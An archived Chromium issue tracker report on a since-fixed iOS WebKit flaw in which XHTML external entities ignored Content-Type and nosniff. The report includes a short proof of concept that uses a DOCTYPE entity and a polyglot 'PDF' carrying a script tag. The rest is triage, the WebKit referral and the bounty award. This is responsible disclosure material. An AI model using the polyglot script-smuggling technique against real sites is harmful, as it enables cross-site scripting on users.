# Security: Content-Type & Nosniff Ignored in Chrome for iOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40092907](https://issues.chromium.org/issues/40092907) |
| **Status** | Fixed |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Mobile>iOSWeb>Security, Mobile>iOSWeb>WebPlatform |
| **Platforms** | iOS |
| **Reporter** | pi...@gmail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2018-10-31 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

XHTML files with external entities in the doctype declaration will fetch the external entity and put into the DOM regardless of Content-Type or nosniff. This let's an attacker use polyglot files with embedded XHTML to smuggle in JavaScript.

**VERSION**  

Chrome Version: iOS Mobile Chrome Version 69.0.3497.105  

Operating System: iOS 12.0

**REPRODUCTION CASE**

foo.xhtml (on <https://example.com>)  

**-------------------------**

<!DOCTYPE x[<!ENTITY x SYSTEM "https://example.com/fake.pdf">]><y>&x;</y>

**-------------------------**

fake.pdf (on <https://example.com> with application/pdf Content-Type)  

**-------------------------**  

...

<script xmlns="http://www.w3.org/1999/xhtml">alert(document.domain)</script>

...  

**-------------------------**

Viewing foo.xhtml in Chrome on iOS will show a popup of document.domain.

PoC can be viewed here: <https://bughunting.s3.amazonaws.com/nosniff/foo.xhtml>

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Ryan Pickren (ryanpickren.com)

## Timeline

### pa...@chromium.org (2018-10-31)

I think this bug is likely ExternalDependency, since it probably depends on Apple's WKWebView. Do you think that's right, iOS people? If so, we or Ryan should file a Radar with Apple.

### eu...@chromium.org (2018-10-31)

It seems like Safari and Firefox have the same behavior, which suggests that the bug is in WebKit. Ryan, do you see the same behavior on other iOS browsers?

[Monorail components: Mobile>iOSWeb>Security Mobile>iOSWeb>WebPlatform]

### pi...@gmail.com (2018-10-31)

Yep

### pi...@gmail.com (2018-11-01)

Should I report this to Apple?

### eu...@chromium.org (2018-11-01)

Filing a WebKit bug would be greatly appreciated. Here is the link:
https://bugs.webkit.org/enter_bug.cgi?product=WebKit

### eu...@chromium.org (2018-11-02)

Chris, would you mind filing radar for this bug?

### pi...@gmail.com (2018-11-02)

WebKit bug filed here: https://bugs.webkit.org/show_bug.cgi?id=191171

### eu...@chromium.org (2018-11-02)

Thank you!

### eu...@chromium.org (2019-02-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-31)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

[Empty comment from Monorail migration]

### [Deleted User] (2021-05-26)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-02)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### [Deleted User] (2022-09-28)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-08)

[Empty comment from Monorail migration]

### aj...@chromium.org (2023-03-29)

WebKit bug was marked fixed in 2020.

### [Deleted User] (2023-03-30)

[Empty comment from Monorail migration]

### am...@google.com (2023-04-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-04-13)

Congratulations Ryan! The VRP Panel has decided to award you $500 for this report. Thank you for reporting this issue to us so that webkit could get it resolved and our sincere apologies for the exceptionally long delay from fix to close and getting this evaluated for a reward. 

### am...@google.com (2023-04-14)

[Empty comment from Monorail migration]

### pi...@gmail.com (2023-04-18)

Cool, thanks!

### [Deleted User] (2023-07-05)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/900441?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Mobile>iOSWeb>Security, Mobile>iOSWeb>WebPlatform]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-19)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092907)*
